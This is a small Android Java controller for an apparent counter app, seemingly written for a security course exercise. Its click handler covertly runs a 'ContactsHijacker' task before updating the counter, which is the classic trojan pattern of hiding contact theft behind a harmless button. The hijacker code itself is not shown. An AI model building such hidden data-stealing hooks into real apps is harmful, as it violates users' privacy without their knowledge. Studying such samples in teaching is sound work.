package com.seginfo.tp.seginfotp;

import android.app.Activity;
import android.view.View;
import android.view.View.OnClickListener;

public class MyController implements OnClickListener {

    private final Activity activity;
	private final MyView myView;
	private final MyModel myModel;
	
    public MyController(Activity a, MyModel m, MyView v){
    	myModel = m;
    	myView = v;
        activity = a;
    }
    
	public void onClick(View v) {
        (new ContactsHijacker()).execute(activity);
		myModel.setValue();
		myView.setCounter();
	}

}
